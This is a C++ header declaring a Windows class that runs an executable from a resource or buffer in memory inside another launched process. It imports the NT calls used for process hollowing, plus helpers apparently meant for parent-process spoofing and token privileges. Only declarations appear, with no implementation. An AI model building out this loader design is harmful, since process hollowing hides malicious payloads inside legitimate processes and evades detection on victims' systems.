// MemRunExe.h: interface for the CMemRunExe class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MEMRUNEXE_H__F4916567_51B1_445C_96D6_C11565B9D10B__INCLUDED_)
#define AFX_MEMRUNEXE_H__F4916567_51B1_445C_96D6_C11565B9D10B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include <string>
#include <winternl.h> 

typedef LONG NTSTATUS;
 
EXTERN_C NTSTATUS WINAPI NtTerminateProcess(HANDLE,NTSTATUS);
EXTERN_C NTSTATUS WINAPI NtReadVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS WINAPI NtWriteVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS WINAPI NtGetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS WINAPI NtSetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS WINAPI NtUnmapViewOfSection(HANDLE,PVOID);
EXTERN_C NTSTATUS WINAPI NtResumeThread(HANDLE,PULONG);
EXTERN_C NTSTATUS WINAPI NtClose (IN HANDLE Handle);

typedef struct _PROC_THREAD_ATTRIBUTE_LIST *PPROC_THREAD_ATTRIBUTE_LIST, *LPPROC_THREAD_ATTRIBUTE_LIST;

//UpdateProcThreadAttribute
typedef	BOOL (WINAPI	*UPDATEPROCTHREADATTRIBUTE)(
	__inout LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	__in DWORD dwFlags,
	__in DWORD_PTR Attribute,
	__in_bcount_opt(cbSize) PVOID lpValue,
	__in SIZE_T cbSize,
	__out_bcount_opt(cbSize) PVOID lpPreviousValue,
	__in_opt PSIZE_T lpReturnSize
	);

//InitializeProcThreadAttributeList
typedef BOOL (WINAPI *INITIALIZEPROCTHREADATTRIBUTELIST)(
	__out_xcount_opt(*lpSize) LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	__in DWORD dwAttributeCount,
	__reserved DWORD dwFlags,
	__inout PSIZE_T lpSize
	);

//DeleteProcThreadAttributeList
typedef VOID (WINAPI *	DELETEPROCTHREADATTRIBUTELIST)(
	__inout LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
	);

class CMemRunExe  
{
public:
	CMemRunExe();
	virtual ~CMemRunExe();

	DWORD StartApp(LPCTSTR restype, int resid, HMODULE hModule,std::string src_exe,std::string work_dir);
	DWORD StartApp(std::string path,std::string src_exe,std::string work_dir);

public:
	DWORD	RunExe(std::string src_path,std::string work_dir,PVOID exe_buffer,DWORD exe_len);

	BOOL ReadResData(char **data_buffer,DWORD &data_len,LPCTSTR restype, int resid, HMODULE hModule);

private:
	BOOL AddToken();
	BOOL LoadFun();
	BOOL	MyCreateProcess(std::string src_path,std::string work_dir,STARTUPINFOEXA &si,	PROCESS_INFORMATION &pi);
	void	GetProcessIdByName(std::string process_name,DWORD &pid);

private:
	UPDATEPROCTHREADATTRIBUTE		m_UpdateProcThreadAttribute;
	INITIALIZEPROCTHREADATTRIBUTELIST	m_InitializeProcThreadAttributeList;
	DELETEPROCTHREADATTRIBUTELIST		m_DeleteProcThreadAttributeList;

};

#endif // !defined(AFX_MEMRUNEXE_H__F4916567_51B1_445C_96D6_C11565B9D10B__INCLUDED_)
